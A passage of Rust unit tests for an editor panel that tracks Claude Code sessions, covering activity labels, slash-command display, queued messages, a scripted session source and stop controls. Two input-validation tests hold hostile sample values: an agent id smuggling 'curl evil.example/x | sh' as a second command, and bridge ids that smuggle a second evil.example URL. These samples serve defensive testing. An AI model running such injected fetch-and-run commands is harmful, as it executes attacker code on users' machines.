        serde_json::json!({
            "type": "assistant",
            "uuid": uuid,
            "message": { "content": [ { "type": "thinking", "thinking": "weighing it up" } ] },
        })
        .to_string()
    }

    fn tool_use_line(uuid: &str, id: &str, name: &str, input: serde_json::Value) -> String {
        serde_json::json!({
            "type": "assistant",
            "uuid": uuid,
            "message": { "content": [
                { "type": "tool_use", "id": id, "name": name, "input": input },
            ] },
        })
        .to_string()
    }

    fn tool_result_line(uuid: &str, tool_use_id: &str) -> String {
        serde_json::json!({
            "type": "user",
            "uuid": uuid,
            "message": { "content": [
                { "type": "tool_result", "tool_use_id": tool_use_id, "content": "done" },
            ] },
        })
        .to_string()
    }

    /// What a session that is thinking looks like: the model's own thinking is the last
    /// thing written, and it is the only sign the model is moving at all.
    #[test]
    fn a_session_whose_last_record_is_thinking_is_thinking() {
        assert_eq!(
            activity_of(&[&user_message_line("a", "go on"), &thinking_line("b")]),
            Activity::Thinking,
            "the last record is the model's thinking, which nothing has answered yet"
        );
    }

    #[test]
    fn thinking_that_something_else_has_followed_is_not_still_thinking() {
        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go on"),
                &thinking_line("b"),
                &tool_use_line(
                    "c",
                    "t1",
                    "Bash",
                    serde_json::json!({ "command": "cargo test -p claude_sessions" }),
                ),
            ]),
            Activity::RunningTool {
                name: SharedString::from("Bash"),
                target: SharedString::from("cargo test -p claude_sessions"),
            },
            "the thinking is over once the call it led to has been written, and the call \
             is the more useful thing to say"
        );

        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go on"),
                &thinking_line("b"),
                &user_message_line("c", "and now this"),
            ]),
            Activity::Idle,
            "a turn the user has spoken into again is not still thinking"
        );
    }

    #[test]
    fn a_call_the_transcript_has_no_result_for_is_running() {
        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go"),
                &tool_use_line(
                    "b",
                    "t1",
                    "Read",
                    serde_json::json!({
                        "file_path": "/Users/user/zed/crates/claude_sessions/src/session_store.rs",
                    }),
                ),
            ]),
            Activity::RunningTool {
                name: SharedString::from("Read"),
                target: SharedString::from("/Users/user/zed/crates/claude_sessions/s…"),
            },
            "the file being read is the first preferred input field; a path that does not \
             fit is truncated rather than reduced to its basename"
        );

        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go"),
                &tool_use_line(
                    "b",
                    "t1",
                    "WebSearch",
                    serde_json::json!({ "query": "gpui" })
                ),
            ]),
            Activity::RunningTool {
                name: SharedString::from("WebSearch"),
                target: SharedString::from("gpui"),
            },
            "query is a preferred target field, so a search names what it is looking for"
        );

        // A command longer than the line has room for: the head of it is what names the
        // call, and the tail is cut rather than the whole thing being dropped.
        let long_command = activity_of(&[
            &user_message_line("a", "go"),
            &tool_use_line(
                "b",
                "t1",
                "Bash",
                serde_json::json!({
                    "command": "  cargo test -p claude_sessions --all-features -- --nocapture  ",
                }),
            ),
        ]);
        let Activity::RunningTool { target, .. } = &long_command else {
            panic!("expected a running tool, got {long_command:?}");
        };
        assert!(
            target.starts_with("cargo test -p claude_sessions"),
            "the head of the command must survive, got {target:?}"
        );
        assert_eq!(
            target.chars().count(),
            TOOL_TARGET_CHARACTERS + 1,
            "{TOOL_TARGET_CHARACTERS} characters and the ellipsis that says there was \
             more, got {target:?} of {} characters",
            target.chars().count()
        );
    }

    #[test]
    fn a_call_whose_result_has_arrived_is_not_running() {
        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go"),
                &tool_use_line("b", "t1", "Bash", serde_json::json!({ "command": "ls" })),
                &tool_result_line("c", "t1"),
            ]),
            Activity::Idle,
            "the result is in the transcript, so the call is over"
        );

        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go"),
                &tool_use_line("b", "t1", "Bash", serde_json::json!({ "command": "ls" })),
                &tool_result_line("c", "t1"),
                &tool_use_line(
                    "d",
                    "t2",
                    "Write",
                    serde_json::json!({ "file_path": "/tmp/notes/plan.md" }),
                ),
            ]),
            Activity::RunningTool {
                name: SharedString::from("Write"),
                target: SharedString::from("/tmp/notes/plan.md"),
            },
            "the call that is running is the newest one without a result, not the first \
             one in the turn"
        );
    }

    #[test]
    fn a_call_left_unanswered_by_a_turn_that_is_over_is_not_running() {
        assert_eq!(
            activity_of(&[
                &user_message_line("a", "go"),
                &tool_use_line(
                    "b",
                    "t1",
                    "Bash",
                    serde_json::json!({ "command": "sleep 600" })
                ),
                &user_message_line("c", "never mind, do this instead"),
            ]),
            Activity::Idle,
            "a call whose result was never written belongs to a turn the user has already \
             spoken past; reporting it as running is the same lie the registry's `status` \
             field tells"
        );
    }

    #[test]
    fn a_conversation_the_model_has_not_answered_yet_is_idle() {
        assert_eq!(
            activity_of(&[]),
            Activity::Idle,
            "there is no session doing anything here"
        );
        assert_eq!(
            activity_of(&[&user_message_line("a", "hello")]),
            Activity::Idle,
            "a message the model has not started answering is not activity"
        );
    }

    #[test]
    fn nothing_is_drawn_above_the_input_for_an_idle_session() {
        assert_eq!(
            activity_label(&Activity::Idle),
            None,
            "a line that appears and disappears at the end of every turn would move the \
             input under the reader's hands"
        );

        assert_eq!(
            activity_label(&Activity::Thinking).as_deref(),
            Some(THINKING_NOTE),
            "the line is only withheld from a session that is doing nothing"
        );
        assert_eq!(
            activity_label(&Activity::RunningTool {
                name: SharedString::from("Bash"),
                target: SharedString::from("cargo test -p claude_sessions"),
            })
            .as_deref(),
            Some("Running Bash: cargo test -p claude_sessions")
        );
        assert_eq!(
            activity_label(&Activity::RunningTool {
                name: SharedString::from("WebSearch"),
                target: SharedString::default(),
            })
            .as_deref(),
            Some("Running WebSearch"),
            "a tool whose target has no rule still names the tool"
        );
    }

    #[test]
    fn a_slash_command_is_shown_as_the_line_the_user_typed() {
        let with_arguments = "<command-name>/goal</command-name>\n            \
             <command-message>goal</command-message>\n            \
             <command-args>幫我把 claude session panel 都修好</command-args>";
        assert_eq!(
            user_visible_text(with_arguments).as_deref(),
            Some("/goal 幫我把 claude session panel 都修好"),
            "the arguments are the words the user typed, so hiding this record whole \
             would break the conversation exactly where they typed them"
        );

        let entries = entries_of(&[&user_message_line("a", with_arguments)]);
        assert_eq!(
            entries.len(),
            1,
            "the record is one line of conversation, got {} entries",
            entries.len()
        );
        assert!(
            matches!(
                &entries[0].kind,
                EntryKind::SlashCommand { text }
                    if text.as_ref() == "/goal 幫我把 claude session panel 都修好"
            ),
            "a slash command must be drawn as the command it was, not as prose"
        );
    }

    #[test]
    fn a_slash_command_with_no_arguments_is_shown_on_its_own() {
        let no_arguments = "<command-name>/compact</command-name>\n            \
             <command-message>compact</command-message>\n            \
             <command-args></command-args>";
        assert_eq!(
            user_visible_text(no_arguments).as_deref(),
            Some("/compact"),
            "a command that takes no arguments still records the empty block, and the \
             command is all there is to show"
        );
    }

    #[test]
    fn a_record_of_nothing_but_a_local_command_is_not_shown() {
        for text in [
            "<local-command-stdout>total 0</local-command-stdout>",
            "<local-command-caveat>the user ran this command themselves</local-command-caveat>",
        ] {
            assert_eq!(
                user_visible_text(text),
                None,
                "{text} is Claude Code's own record of a local command, with no message \
                 in it to show"
            );
        }
    }

    #[test]
    fn arguments_holding_a_tag_do_not_swallow_the_rest_of_the_record() {
        assert_eq!(
            user_visible_text(
                "<command-name>/ask</command-name><command-args>why is a < b</command-args>"
            )
            .as_deref(),
            Some("/ask why is a < b"),
            "the arguments are text the user typed, and a `<` in them starts nothing"
        );

        // What a record read while it is being written looks like: the arguments were
        // opened and the closing tag has not been written yet.
        let truncated = "<command-name>/ask</command-name><command-args>why is a";
        assert_eq!(
            user_visible_text(truncated).as_deref(),
            Some(truncated),
            "with no closing tag there is nothing to rewrite, and guessing where the \
             arguments ended would eat the rest of the record"
        );
    }

    fn queued_texts(entries: &[Entry]) -> Vec<SharedString> {
        entries
            .iter()
            .filter_map(|entry| match &entry.kind {
                EntryKind::Queued { text } => Some(text.clone()),
                _ => None,
            })
            .collect()
    }

    /// The queue log holds the line Claude Code was handed, envelope and all. Drawn
    /// verbatim it put the three literal `<channel …>` lines on screen under a `Queued`
    /// label, which is where the reader first saw this bug.
    #[test]
    fn a_queued_channel_message_is_drawn_as_its_inner_text() {
        let typed = "可以了 channel connected";
        let queued = vec![SharedString::from(channel_envelope(typed))];
        let entries = queued_entries(&queued);

        let texts = queued_texts(&entries);
        assert_eq!(
            texts,
            vec![SharedString::from(typed)],
            "a queue row is the reader's own words, not the envelope they travelled in"
        );
        assert!(
            !entries.iter().any(entry_holds_channel_open),
            "no <channel survives in a queue row; got {texts:?}"
        );
    }

    /// What the new boundary could wrongly cut: the queue log carries no origin field, so
    /// a line is unwrapped only when it is nothing but an envelope. A message typed at the
    /// terminal that quotes the tags keeps every character of them.
    #[test]
    fn a_queued_message_that_only_quotes_the_tags_is_kept_whole() {
        let quoting = "the wrapper is <channel source=\"zed-claude\"> … </channel>, see?";
        let trailing = "wrap it in <channel source=\"zed-claude\"></channel>";
        let queued = vec![
            SharedString::from(quoting),
            SharedString::from(trailing),
            SharedString::from("<channels> is not the tag"),
        ];

        assert_eq!(
            queued_texts(&queued_entries(&queued)),
            vec![
                SharedString::from(quoting),
                SharedString::from(trailing),
                SharedString::from("<channels> is not the tag"),
            ],
            "only a line that is nothing but an envelope is unwrapped"
        );
    }

    const SCRIPTED_PROCESS_ID: u32 = 4242;
    const SCRIPTED_SESSION_ID: &str = "scripted-session";
    const SCRIPTED_AGENT_ID: &str = "a1";
    /// Longer than both of the store's poll intervals, so that advancing by it lets a
    /// scan and a read of each conversation land.
    const A_FEW_POLLS: Duration = Duration::from_secs(2);

    fn scripted_agent() -> TranscriptTarget {
        TranscriptTarget::Subagent {
            agent_id: SCRIPTED_AGENT_ID.to_string(),
            workflow_run_id: None,
        }
    }

    /// One line of a conversation being followed, chained to the record before it so
    /// that the traversal keeps both of them, and marked as an agent's or the session's
    /// own.
    fn chained_line(
        record_type: &str,
        uuid: &str,
        parent_uuid: Option<&str>,
        is_sidechain: bool,
        content: serde_json::Value,
    ) -> String {
        serde_json::json!({
            "type": record_type,
            "uuid": uuid,
            "parentUuid": parent_uuid,
            "isSidechain": is_sidechain,
            "message": { "content": content },
        })
        .to_string()
    }

    fn unanswered_bash_call(uuid: &str, parent_uuid: Option<&str>, is_sidechain: bool) -> String {
        chained_line(
            ASSISTANT_RECORD_TYPE,
            uuid,
            parent_uuid,
            is_sidechain,
            serde_json::json!([
                {
                    "type": "tool_use",
                    "id": "call-1",
                    "name": "Bash",
                    "input": { "command": "cargo test -p claude_sessions" },
                }
            ]),
        )
    }

    /// The two conversations of one session, handed to the store as reads rather than as
    /// files. What these tests are about is which of the two a decision is read from, and
    /// nothing else about a transcript file takes part in that.
    struct ScriptedSource {
        home_directory: PathBuf,
        sessions: Mutex<Vec<RegisteredSession>>,
        session_lines: Mutex<Vec<String>>,
        agent_lines: Mutex<Vec<String>>,
        file_list_requests: Mutex<Vec<(PathBuf, String)>>,
        slash_command_roots: Mutex<Vec<Option<PathBuf>>>,
        /// What a read of a sent file hands back, for the tests that draw one.
        attachment_bytes: Vec<u8>,
    }

    impl ScriptedSource {
        fn new(session_lines: &[String], agent_lines: &[String]) -> Self {
            Self {
                home_directory: PathBuf::from("/scripted-home"),
                sessions: Mutex::new(vec![scripted_registered_session()]),
                session_lines: Mutex::new(session_lines.to_vec()),
                agent_lines: Mutex::new(agent_lines.to_vec()),
                file_list_requests: Mutex::new(Vec::new()),
                slash_command_roots: Mutex::new(Vec::new()),
                attachment_bytes: Vec::new(),
            }
        }

        fn with_attachment(mut self, bytes: Vec<u8>) -> Self {
            self.attachment_bytes = bytes;
            self
        }

        /// Hands over whatever has not been delivered yet, so that the poll's later turns
        /// report a file that has stopped growing rather than the same records again.
        fn deliver(
            lines: &Mutex<Vec<String>>,
            path: PathBuf,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            let delivered = std::mem::take(&mut *lines.lock().expect("reading the scripted lines"));
            let offset = state
                .offset
                .saturating_add(delivered.len().try_into().unwrap_or(u64::MAX));
            Task::ready(Ok(TailProgress {
                path: Some(path),
                start_offset: state.offset,
                offset,
                pending: Vec::new(),
                lines: delivered,
                restarted: false,
            }))
        }
    }

    /// The one session every scripted scan reports, as a scan reports it.
    fn scripted_registered_session() -> RegisteredSession {
        RegisteredSession {
            process_id: SCRIPTED_PROCESS_ID,
            session_id: SCRIPTED_SESSION_ID.to_string(),
            working_directory: PathBuf::from("/scripted-project"),
            process_start: "Thu Sep 10 02:27:23 2026".to_string(),
            version: "2.1.267".to_string(),
            kind: "interactive".to_string(),
            name: Some("scripted".to_string()),
            status: None,
            updated_at: None,
            // No pane to type into: nothing in these tests sends, and this is what makes
            // a send impossible rather than merely unused.
            tmux_target: None,
            bridge_session_id: None,
        }
    }

    impl SessionSource for ScriptedSource {
        fn list_sessions(
            &self,
            _project_root: Option<PathBuf>,
        ) -> Task<anyhow::Result<SessionListing>> {
            Task::ready(Ok(SessionListing {
                sessions: self
                    .sessions
                    .lock()
                    .expect("reading scripted sessions")
                    .iter()
                    .cloned()
                    .map(|session| SessionSummary {
                        session,
                        transcript_path: Some(self.home_directory.join("session.jsonl")),
                        spend: None,
                    })
                    .collect(),
                home_directory: self.home_directory.clone(),
                liveness_unavailable_reason: None,
            }))
        }

        fn tail_transcript(
            &self,
            _session_id: String,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            Self::deliver(
                &self.session_lines,
                self.home_directory.join("session.jsonl"),
                state,
            )
        }

        fn list_subagents(
            &self,
            _session_id: String,
        ) -> Task<anyhow::Result<Vec<SubagentSummary>>> {
            Task::ready(Ok(vec![SubagentSummary {
                agent_id: SCRIPTED_AGENT_ID.to_string(),
                workflow_run_id: None,
                meta: SubagentMeta {
                    agent_type: "general-purpose".to_string(),
                    description: Some("read the file".to_string()),
                    tool_use_id: None,
                    spawn_depth: 1,
                    model: None,
                    workflow_phase: None,
                    request_shape: None,
                },
                transcript_path: self.home_directory.join("agent-a1.jsonl"),
                size: 1,
                workflow_agent_finished: None,
                task_agent_finished: None,
            }]))
        }

        /// The same one agent, under whichever session was asked for: these tests have
        /// one session, and what they are about is which conversation is read rather than
        /// which session an agent belongs to.
        fn list_subagents_for_sessions(
            &self,
            session_ids: Vec<String>,
        ) -> Task<anyhow::Result<HashMap<String, Vec<SubagentSummary>>>> {
            let mut subagents_by_session = HashMap::default();
            for session_id in session_ids {
                let listed = self.list_subagents(session_id.clone());
                subagents_by_session.insert(session_id, smol::block_on(listed).unwrap_or_default());
            }
            Task::ready(Ok(subagents_by_session))
        }

        fn tail_events(
            &self,
            _session_id: String,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            Task::ready(Ok(TailProgress {
                path: None,
                start_offset: state.offset,
                offset: state.offset,
                pending: state.pending,
                lines: Vec::new(),
                restarted: false,
            }))
        }

        fn read_status(&self, _session_id: String) -> Task<anyhow::Result<Option<String>>> {
            Task::ready(Ok(None))
        }

        fn install_hooks(&self) -> Task<anyhow::Result<HookInstallOutcome>> {
            Task::ready(Ok(HookInstallOutcome::AlreadyCurrent))
        }

        fn hooks_installed(&self) -> Task<anyhow::Result<bool>> {
            Task::ready(Ok(false))
        }

        fn list_session_files(
            &self,
            directory: PathBuf,
            query: String,
        ) -> Task<anyhow::Result<Vec<String>>> {
            self.file_list_requests
                .lock()
                .expect("recording a file listing")
                .push((directory, query));
            Task::ready(Ok(Vec::new()))
        }

        fn write_session_file(
            &self,
            _name: String,
            _contents: Vec<u8>,
        ) -> Task<anyhow::Result<String>> {
            Task::ready(Err(anyhow::anyhow!("nothing is written in these tests")))
        }
        fn list_slash_commands(
            &self,
            project_root: Option<PathBuf>,
        ) -> Task<anyhow::Result<Vec<SlashCommand>>> {
            self.slash_command_roots
                .lock()
                .expect("recording a slash-command listing")
                .push(project_root);
            Task::ready(Ok(Vec::new()))
        }

        fn tail_subagent(
            &self,
            _session_id: String,
            _agent_id: String,
            _workflow_run_id: Option<String>,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            Self::deliver(
                &self.agent_lines,
                self.home_directory.join("agent-a1.jsonl"),
                state,
            )
        }

        fn read_file(&self, _path: PathBuf, _max_bytes: u64) -> Task<anyhow::Result<FileContents>> {
            Task::ready(Ok(FileContents {
                bytes: Vec::new(),
                truncated: false,
            }))
        }

        fn read_attachment(
            &self,
            _session_id: String,
            _path: PathBuf,
            _max_bytes: u64,
        ) -> Task<anyhow::Result<FileContents>> {
            Task::ready(Ok(FileContents {
                bytes: self.attachment_bytes.clone(),
                truncated: false,
            }))
        }

        fn channel_status(&self, _claude_pid: u32) -> Task<anyhow::Result<ChannelStatus>> {
            Task::ready(Ok(ChannelStatus {
                live: false,
                heartbeat_at_ms: None,
                server_pid: None,
                features: Vec::new(),
            }))
        }

        fn channel_send_message(
            &self,
            _claude_pid: u32,
            _content: String,
        ) -> Task<anyhow::Result<String>> {
            Task::ready(Err(anyhow::anyhow!(
                "nothing in these tests may reach a session"
            )))
        }

        fn channel_interrupt(
            &self,
            _claude_pid: u32,
            _reason: String,
        ) -> Task<anyhow::Result<String>> {
            Task::ready(Err(anyhow::anyhow!(
                "nothing in these tests may reach a session"
            )))
        }

        fn channel_answer_permission(
            &self,
            _claude_pid: u32,
            _request_id: String,
            _allow: bool,
        ) -> Task<anyhow::Result<String>> {
            Task::ready(Err(anyhow::anyhow!(
                "nothing in these tests may reach a session"
            )))
        }

        fn tail_channel_inbox(
            &self,
            _claude_pid: u32,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            Task::ready(Ok(TailProgress {
                path: None,
                start_offset: state.offset,
                offset: state.offset,
                pending: state.pending,
                lines: Vec::new(),
                restarted: false,
            }))
        }
    }

    /// A root view for the test window. The panel is never drawn: these tests are about
    /// which conversation it reads rather than about how it looks, and drawing it would
    /// pull in the whole of the application's theme wiring.
    struct NoUi;

    impl Render for NoUi {
        fn render(&mut self, _window: &mut Window, _cx: &mut Context<Self>) -> impl IntoElement {
            div()
        }
    }

    /// The panel over a store fed by [`ScriptedSource`], with the fields
    /// [`ClaudeSessionsPanel::new`] gives it.
    ///
    /// The workspace and the project take no part in what these tests are about — which
    /// of the two conversations a decision is read from — and the panel holds the
    /// workspace only to open a file a conversation names, which none of them do.
    fn scripted_panel(
        session_lines: &[String],
        agent_lines: &[String],
        cx: &mut gpui::TestAppContext,
    ) -> Entity<ClaudeSessionsPanel> {
        scripted_panel_over(
            Arc::new(ScriptedSource::new(session_lines, agent_lines)),
            cx,
        )
    }

    fn scripted_panel_over(
        source: Arc<dyn SessionSource>,
        cx: &mut gpui::TestAppContext,
    ) -> Entity<ClaudeSessionsPanel> {
        cx.update(|cx| {
            let settings_store = settings::SettingsStore::test(cx);
            cx.set_global(settings_store);
            theme::init(theme::LoadThemes::JustBase, cx);
        });

        let window = cx.add_window(|_window, _cx| NoUi);
        window
            .update(cx, |_, _window, cx| {
                cx.new(|cx| {
                    let store = cx.new(|cx| ClaudeSessionStore::new(source.clone(), None, cx));
                    let store_subscription =
                        cx.observe(&store, |this: &mut ClaudeSessionsPanel, _, cx| {
                            this.rebuild_entries(cx);
                            cx.notify();
                        });

                    ClaudeSessionsPanel {
                        workspace: WeakEntity::new_invalid(),
                        focus_handle: cx.focus_handle(),
                        fs: fs::FakeFs::new(cx.background_executor().clone()),
                        store,
                        source,
                        project_root: None,
                        in_pane: false,
                        terminal: None,
                        terminal_for: None,
                        _terminal_attach: Task::ready(()),
                        rail_expanded: true,
                        rail_shows_everything: false,
                        permission_answered: false,
                        permission_answered_for: None,
                        live_message_scroll: ScrollHandle::new(),
                        live_message_length: 0,
                        live_message_markdown_key: None,
                        live_message_identity: None,
                        live_message_height: px(160.),
                        live_message_drag: None,
                        now_row_expanded: false,
                        interrupt_sent_at_ms: None,
                        stop_armed_until_ms: None,
                        lifecycle_note: None,
                        _lifecycle_command: Task::ready(()),
                        hook_install_note: None,
                        _installing_hook: Task::ready(()),
                        entries: Vec::new(),
                        activity: Activity::Idle,
                        agent_calls: HashMap::default(),
                        billing: HashMap::default(),
                        turn_bills: HashMap::default(),
                        list_state: ListState::new(0, ListAlignment::Bottom, px(1024.)),
                        session_list_expanded: true,
                        collapsed_session_agents: HashSet::default(),
                        unread_below: UnreadBelow::default(),
                        scrolled_to_end: true,
                        expanded: HashSet::default(),
                        show_full_history: false,
                        show_tool_calls: false,
                        show_costs: false,
                        markdowns: HashMap::default(),
                        entry_cache: EntryCache::default(),
                        cached_transcript_generation: 0,
                        cached_home_directory: None,
                        overwrites_dropped: 0,
                        loaded_outputs: HashMap::default(),
                        output_loads: HashMap::default(),
                        loaded_attachments: HashMap::default(),
                        forced_attachment_loads: HashSet::default(),
                        dispatch_prompts: HashMap::default(),
                        patched_calls: HashSet::default(),
                        attachment_loads: HashMap::default(),
                        entries_generation: 0,
                        reachable_anchors: Vec::new(),
                        anchor_cache: None,
                        cached_scrolled_back: false,
                        rail_width: px(RAIL_WIDTH_DEFAULT_PIXELS),
                        rail_row_budget: None,
                        rail_drag_position: None,
                        zoomed_image: None,
                        anchored_on_screen: HashSet::default(),
                        hovered_anchor: None,
                        followed_index: None,
                        _store_subscription: store_subscription,
                    }
                })
            })
            .expect("building the panel in the test window")
    }

    /// A tab opened for a session reads that session's conversation.
    ///
    /// The store is built the way [`ClaudeSessionsPanel::reveal_session_in_pane`] builds
    /// it — constructed and selected in the same closure, before any scan has been
    /// applied — which is the opposite order from every other test here and is the order
    /// the conversation a reader actually opens is read in.
    #[gpui::test]
    async fn a_tab_selected_before_its_first_scan_still_finds_the_transcript(
        cx: &mut gpui::TestAppContext,
    ) {
        cx.update(|cx| {
            let settings_store = settings::SettingsStore::test(cx);
            cx.set_global(settings_store);
        });

        let session_lines = [chained_line(
            USER_RECORD_TYPE,
            "u1",
            None,
            false,
            serde_json::json!("hello"),
        )];
        let source: Arc<dyn SessionSource> = Arc::new(ScriptedSource::new(&session_lines, &[]));
        let store = cx.update(|cx| {
            cx.new(|cx| {
                let mut store = ClaudeSessionStore::new(source.clone(), None, cx);
                store.select(SCRIPTED_SESSION_ID, cx);
                store
            })
        });

        cx.run_until_parked();
        // Both polls sleep between turns, so a scan only lands once the clock has moved.
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        let (listed, selected, transcript_path) = store.read_with(cx, |store, _| {
            (
                store.sessions().len(),
                store.selected().map(str::to_string),
                store.transcript_path().map(Path::to_path_buf),
            )
        });

        assert_eq!(
            listed, 1,
            "the scan must reach a store that was selected before it; expected 1 listed session, got {listed}"
        );
        assert_eq!(
            selected,
            Some(SCRIPTED_SESSION_ID.to_string()),
            "the selection made before the scan must survive it; expected Some({SCRIPTED_SESSION_ID}), got {selected:?}"
        );
        assert!(
            transcript_path.is_some(),
            "without a transcript path the tab draws {WAITING_FOR_TRANSCRIPT:?} forever; expected Some(path), got None"
        );
    }

    /// `/clear` records an old→new session id on the store, and the store keeps every
    /// pair until something takes it. The only reader was pending sends. With that gone,
    /// the panel still has to take the pairs: the store lives as long as the panel does,
    /// and nothing else will.
    #[gpui::test]
    async fn the_panel_drains_cleared_rebinds_so_they_do_not_accumulate(
        cx: &mut gpui::TestAppContext,
    ) {
        let source = Arc::new(ScriptedSource::new(&[], &[]));
        let panel = scripted_panel_over(source.clone(), cx);
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        panel.update(cx, |panel, cx| {
            panel.store.update(cx, |store, cx| {
                assert_eq!(
                    store.sessions().len(),
                    1,
                    "the first scan has to list the scripted session before it is cleared"
                );
                store.select(SCRIPTED_SESSION_ID, cx);
            });
        });

        for session_id in ["after-clear-1", "after-clear-2"] {
            let mut session = scripted_registered_session();
            session.session_id = session_id.to_string();
            *source
                .sessions
                .lock()
                .expect("replacing the scripted session") = vec![session];
            cx.executor().advance_clock(A_FEW_POLLS);
            cx.run_until_parked();
        }

        let (selected, rebinds) = panel.update(cx, |panel, cx| {
            panel.store.update(cx, |store, _cx| {
                (
                    store.selected().map(str::to_string),
                    store.take_cleared_rebinds(),
                )
            })
        });
        assert_eq!(
            selected.as_deref(),
            Some("after-clear-2"),
            "both /clear scans have to move the selection, or an empty take is not evidence"
        );
        assert!(
            rebinds.is_empty(),
            "the panel has to take /clear pairs or the store keeps every one; left {rebinds:?}"
        );
    }

    #[gpui::test]
    async fn the_stop_control_is_disabled_while_idle(cx: &mut gpui::TestAppContext) {
        let panel = scripted_panel(&[], &[], cx);
        let (can_interrupt, reason) = panel.update(cx, |panel, cx| {
            let store = panel.store.read(cx);
            (store.can_interrupt(), store.interrupt_disabled_reason())
        });
        assert!(
            !can_interrupt,
            "Stop stays disabled while the session is idle"
        );
        assert!(
            reason.is_some(),
            "the disabled Stop control must explain why"
        );
    }

    fn sample_ended_session(bridge: bool, tmux: bool) -> EndedSession {
        EndedSession {
            session_id: "ended-session".to_string(),
            name: Some("ended".to_string()),
            ai_title: None,
            cwd: PathBuf::from("/tmp/project"),
            tmux: tmux.then(|| "work:@0.%1".to_string()),
            bridge_session_id: bridge.then(|| "bridge-id".to_string()),
            transcript_path: None,
            last_seen_ms: 0,
            ended_reason: EndedReason::ProcessGone,
        }
    }

    fn sample_background_session() -> LiveSession {
        LiveSession {
            session: scripted_registered_session(),
            background: true,
            agent_id: Some("a1b2".to_string()),
            state: Some("working".to_string()),
            waiting_for: None,
        }
    }

    #[test]
    fn an_ended_row_offers_resume_open_in_claude_ai_and_dismiss() {
        assert_eq!(
            ClaudeSessionsPanel::ended_row_action_labels(&sample_ended_session(true, false)),
            vec!["Resume", "Open in claude.ai", "Dismiss"]
        );
        assert_eq!(
            ClaudeSessionsPanel::ended_row_action_labels(&sample_ended_session(false, true)),
            vec!["Resume", "Open in tmux", "Dismiss"]
        );
    }

    /// The terminal is opened on one string a shell reads, and on a remote project the id
    /// in that string is the host's answer rather than this machine's.
    #[test]
    fn an_agent_id_that_could_run_a_second_command_is_not_attached_to() {
        assert_eq!(
            attach_command("a1b2c3d4"),
            Some("claude attach a1b2c3d4".to_string()),
            "the short id an agents listing really gives must still open a terminal"
        );
        assert_eq!(
            attach_command("0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d"),
            Some("claude attach 0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d".to_string()),
            "a hyphenated id is a legal id, not an option"
        );
        assert_eq!(
            attach_command("x; curl evil.example/x | sh"),
            None,
            "an id carrying a second command must never become a command line"
        );
        assert_eq!(
            attach_command("--help"),
            None,
            "an id must not be able to reach claude as an option"
        );
        assert_eq!(attach_command(""), None);
    }

    /// The Open-in-claude.ai buttons hand this string to the machine's URL opener, so it
    /// has to be a claude.ai https URL and nothing else — the same bound `bridge_status`
    /// records already go through.
    #[test]
    fn a_bridge_session_id_that_is_not_a_claude_ai_path_is_not_opened() {
        assert_eq!(
            claude_ai_session_url(Some("session_01abc")),
            Some("https://claude.ai/code/session_01abc".to_string()),
            "the id a transcript writes must still open the bridge"
        );
        assert_eq!(
            claude_ai_session_url(Some("0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d")),
            Some("https://claude.ai/code/0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d".to_string()),
            "a hyphenated uuid is a legal bridge id"
        );
        assert_eq!(
            claude_ai_session_url(Some("x\nhttps://evil.example")),
            None,
            "a newline must not turn the opener onto a second URL"
        );
        assert_eq!(
            claude_ai_session_url(Some("x https://evil.example")),
            None,
            "a space is the same class of break"
        );
        assert_eq!(claude_ai_session_url(Some("x\u{0007}")), None);
        assert_eq!(claude_ai_session_url(Some("")), None);
        assert_eq!(claude_ai_session_url(None), None);
    }

    #[test]
    fn a_live_background_row_offers_attach_respawn_and_stop() {
        assert_eq!(
            ClaudeSessionsPanel::background_row_action_labels(&sample_background_session()),
            vec!["Attach", "Respawn", "Stop"]
        );
        let mut interactive = sample_background_session();
        interactive.background = false;
        assert!(
            ClaudeSessionsPanel::background_row_action_labels(&interactive).is_empty(),
            "interactive rows do not offer attach/respawn/stop"
        );
    }

    #[gpui::test]
    async fn stop_disarms_after_five_seconds(cx: &mut gpui::TestAppContext) {
        let panel = scripted_panel(&[], &[], cx);
        panel.update(cx, |panel, cx| {
            panel.arm_or_stop("a1b2".to_string(), PathBuf::from("/tmp/project"), cx);
            assert!(
                panel.stop_is_armed("a1b2"),
                "the first click arms Stop rather than sending it"
            );
            panel.stop_armed_until_ms = Some(("a1b2".to_string(), now_millis() - 1));
            assert!(
                !panel.stop_is_armed("a1b2"),
                "an armed Stop that has sat past five seconds is no longer armed"
            );
        });
    }

    #[gpui::test]
    async fn a_second_stop_click_within_five_seconds_fires_and_disarms(
        cx: &mut gpui::TestAppContext,
    ) {
        let panel = scripted_panel(&[], &[], cx);
        panel.update(cx, |panel, cx| {
            panel.arm_or_stop("a1b2".to_string(), PathBuf::from("/tmp/project"), cx);
            assert!(panel.stop_is_armed("a1b2"));
            panel.arm_or_stop("a1b2".to_string(), PathBuf::from("/tmp/project"), cx);
            assert!(
                !panel.stop_is_armed("a1b2"),
                "the confirming click must disarm even if the command itself fails"
            );
        });
    }

    /// Selects the scripted session and lets the polls deliver its own conversation.
    fn read_the_scripted_session(
        panel: &Entity<ClaudeSessionsPanel>,
        cx: &mut gpui::TestAppContext,
    ) {
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();
        panel.update(cx, |panel, cx| {
            panel.select_session(SCRIPTED_SESSION_ID.to_string(), cx)
        });
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();
    }

    fn read_the_conversation_of(
        target: TranscriptTarget,
        panel: &Entity<ClaudeSessionsPanel>,
        cx: &mut gpui::TestAppContext,
    ) {
        // What opening an agent as a tab of its own builds that tab's store to be, with
